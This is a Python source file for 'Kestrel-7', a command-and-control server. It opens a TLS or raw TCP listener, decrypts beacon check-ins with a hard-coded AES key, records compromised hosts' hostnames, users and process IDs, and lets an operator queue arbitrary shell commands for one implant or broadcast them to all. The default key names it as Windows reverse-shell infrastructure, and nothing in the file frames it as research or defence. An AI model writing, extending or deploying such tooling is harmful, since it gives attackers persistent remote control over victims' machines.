#!/usr/bin/env python3
"""
c2_server.py - Kestrel-7 Enterprise C2 Handler & Multi-Session Dispatcher
Provides HTTPS (TLS 1.3/1.2) + Raw TCP Listener, Auto-Certificate Generation, 
CNG/AES-256 Decryption, and Interactive Command Terminal.
"""

import os
import sys
import ssl
import time
import json
import socket
import select
import base64
import argparse
import threading
import subprocess
from datetime import datetime
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
import hashlib

class KestrelC2Server:
    def __init__(self, host='0.0.0.0', port=443, key='Kestrel7_Win11_RevShell_2026', cert_dir='certs'):
        self.host = host
        self.port = port
        self.raw_key = key.encode('utf-8')
        self.key = hashlib.sha256(self.raw_key).digest()
        self.cert_dir = cert_dir
        self.running = True
        
        # State tracking
        self.sessions = {}       # client_id -> session dict
        self.command_queue = {}  # client_id -> list of pending commands
        self.results_log = {}    # client_id -> list of (timestamp, cmd, result)
        self.lock = threading.Lock()
        
    def ensure_certificates(self):
        os.makedirs(self.cert_dir, exist_ok=True)
        cert_file = os.path.join(self.cert_dir, 'server.crt')
        key_file = os.path.join(self.cert_dir, 'server.key')
        
        if not os.path.exists(cert_file) or not os.path.exists(key_file):
            print("[*] Generating self-signed SSL/TLS certificate...")
            cmd = [
                'openssl', 'req', '-new', '-newkey', 'rsa:2048', '-days', '365',
                '-nodes', '-x509', '-subj', '/CN=kestrel7.internal/O=Enterprise/C=US',
                '-keyout', key_file, '-out', cert_file
            ]
            try:
                subprocess.run(cmd, check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                print(f"[+] Certificate generated: {cert_file}")
            except Exception as e:
                print(f"[!] Warning: OpenSSL cert generation failed ({e}). Running without TLS wrapper.")
                return None, None
        return cert_file, key_file

    def decrypt(self, data: bytes) -> bytes:
        if not data:
            return b""
        # 1. Try AES-256-CBC with Zero IV
        try:
            cipher = AES.new(self.key, AES.MODE_CBC, b'\x00' * 16)
            decrypted = cipher.decrypt(data)
            # Remove padding or trailing nulls
            try:
                return unpad(decrypted, AES.block_size)
            except Exception:
                return decrypted.rstrip(b'\x00')
        except Exception:
            pass
            
        # 2. Fallback: Dynamic rolling XOR
        res = bytearray(data)
        for i in range(len(res)):
            res[i] ^= self.raw_key[i % len(self.raw_key)] ^ (i & 0xFF)
        return bytes(res).rstrip(b'\x00')

    def encrypt(self, data: bytes) -> bytes:
        # Zero-padded AES-256-CBC
        cipher = AES.new(self.key, AES.MODE_CBC, b'\x00' * 16)
        return cipher.encrypt(pad(data, AES.block_size))

    def handle_http_request(self, raw_data: bytes, addr: tuple) -> bytes:
        """Parses minimal HTTP POST /beacon or /results and returns formatted HTTP response"""
        client_id = f"{addr[0]}:{addr[1]}"
        lines = raw_data.split(b'\r\n')
        request_line = lines[0].decode('utf-8', errors='ignore') if lines else ""
        
        # Locate body
        body_idx = raw_data.find(b'\r\n\r\n')
        body = raw_data[body_idx + 4:] if body_idx != -1 else b""
        
        decrypted_body = self.decrypt(body)
        timestamp = datetime.now().strftime("%H:%M:%S")
        
        if "POST /beacon" in request_line:
            try:
                telemetry = json.loads(decrypted_body.decode('utf-8', errors='ignore'))
                beacon_id = telemetry.get('beacon', client_id)
                with self.lock:
                    self.sessions[beacon_id] = {
                        'client_id': client_id,
                        'ip': addr[0],
                        'port': addr[1],
                        'hostname': telemetry.get('hostname', 'UNKNOWN'),
                        'user': telemetry.get('user', 'UNKNOWN'),
                        'arch': telemetry.get('arch', 'x64'),
                        'pid': telemetry.get('pid', 'N/A'),
                        'last_seen': timestamp
                    }
                    if beacon_id not in self.command_queue:
                        self.command_queue[beacon_id] = []
                    
                    # Pop next queued command or return sleep
                    if self.command_queue[beacon_id]:
                        next_cmd = self.command_queue[beacon_id].pop(0)
                        resp_payload = self.encrypt(next_cmd.encode('utf-8'))
                    else:
                        resp_payload = self.encrypt(b"sleep")
            except Exception as e:
                resp_payload = self.encrypt(b"sleep")
                
            http_resp = (
                b"HTTP/1.1 200 OK\r\n"
                b"Content-Type: application/octet-stream\r\n"
                b"Content-Length: " + str(len(resp_payload)).encode() + b"\r\n"
                b"Connection: close\r\n\r\n" + resp_payload
            )
            return http_resp

        elif "POST /results" in request_line:
            with self.lock:
                output_str = decrypted_body.decode('utf-8', errors='replace')
                print(f"\n[+] [{timestamp}] Output from {client_id}:\n{output_str}\nC2> ", end="", flush=True)
            http_resp = b"HTTP/1.1 200 OK\r\nContent-Length: 0\r\nConnection: close\r\n\r\n"
            return http_resp

        # Raw TCP stream fallback
        return self.encrypt(b"sleep")

    def client_worker(self, conn, addr):
        conn.settimeout(10.0)
        try:
            data = conn.recv(65535)
            if data:
                response = self.handle_http_request(data, addr)
                conn.sendall(response)
        except Exception:
            pass
        finally:
            conn.close()

    def start_listener(self):
        cert_file, key_file = self.ensure_certificates()
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind((self.host, self.port))
        sock.listen(128)
        
        if cert_file and key_file:
            context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
            context.load_cert_chain(certfile=cert_file, keyfile=key_file)
            server_sock = context.wrap_socket(sock, server_side=True)
            proto = "HTTPS (TLS)"
        else:
            server_sock = sock
            proto = "HTTP / TCP Raw"
            
        print(f"[+] Kestrel-7 C2 Server listening on {self.host}:{self.port} [{proto}]")
        print("[+] Type 'help' or 'sessions' to begin.\n")
        
        while self.running:
            try:
                conn, addr = server_sock.accept()
                t = threading.Thread(target=self.client_worker, args=(conn, addr), daemon=True)
                t.start()
            except Exception:
                break

    def run_cli(self):
        while self.running:
            try:
                prompt = input("C2> ").strip()
                if not prompt:
                    continue
                tokens = prompt.split(maxsplit=2)
                verb = tokens[0].lower()
                
                if verb in ('sessions', 'list', 'beacons'):
                    with self.lock:
                        if not self.sessions:
                            print("[-] No active beacons registered yet.")
                        else:
                            print("\n" + "="*85)
                            print(f"{'BEACON ID':<26} {'HOST / USER':<25} {'ARCH':<6} {'PID':<8} {'LAST SEEN':<10}")
                            print("="*85)
                            for bid, s in self.sessions.items():
                                print(f"{bid:<26} {s['hostname'] + '/' + s['user']:<25} {s['arch']:<6} {s['pid']:<8} {s['last_seen']:<10}")
                            print("="*85 + "\n")
                            
                elif verb == 'exec':
                    if len(tokens) < 3:
                        print("[-] Usage: exec <BEACON_ID> <COMMAND>")
                    else:
                        bid, cmd = tokens[1], tokens[2]
                        with self.lock:
                            if bid in self.sessions:
                                self.command_queue[bid].append(cmd)
                                print(f"[+] Queued command for {bid}: {cmd}")
                            else:
                                print(f"[-] Beacon '{bid}' not found. Run 'sessions' to view active hosts.")
                                
                elif verb == 'broadcast':
                    if len(tokens) < 2:
                        print("[-] Usage: broadcast <COMMAND>")
                    else:
                        cmd = tokens[1] if len(tokens) == 2 else prompt.split(maxsplit=1)[1]
                        with self.lock:
                            for bid in self.sessions:
                                self.command_queue[bid].append(cmd)
                            print(f"[+] Broadcasted command to {len(self.sessions)} hosts.")
                            
                elif verb == 'help':
                    print("\nKestrel-7 C2 Interactive Commands:")
                    print("  sessions                  - List active agent sessions and telemetry")
                    print("  exec <BEACON_ID> <CMD>    - Queue a command for a specific agent")
                    print("  broadcast <CMD>           - Queue a command for all active agents")
                    print("  help                      - Show this command reference")
                    print("  quit / exit               - Shutdown C2 server\n")
                    
                elif verb in ('quit', 'exit'):
                    print("[*] Terminating C2 listener...")
                    self.running = False
                    break
                else:
                    print(f"[-] Unknown command: '{verb}'. Type 'help' for options.")
            except (KeyboardInterrupt, EOFError):
                self.running = False
                break

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description="Kestrel-7 C2 Server")
    parser.add_argument('--host', default='0.0.0.0', help="Listen IP (default: 0.0.0.0)")
    parser.add_argument('--port', type=int, default=443, help="Listen Port (default: 443)")
    parser.add_argument('--key', default='Kestrel7_Win11_RevShell_2026', help="AES-256 Shared Key")
    args = parser.parse_args()
    
    server = KestrelC2Server(host=args.host, port=args.port, key=args.key)
    listener_thread = threading.Thread(target=server.start_listener, daemon=True)
    listener_thread.start()
    server.run_cli()
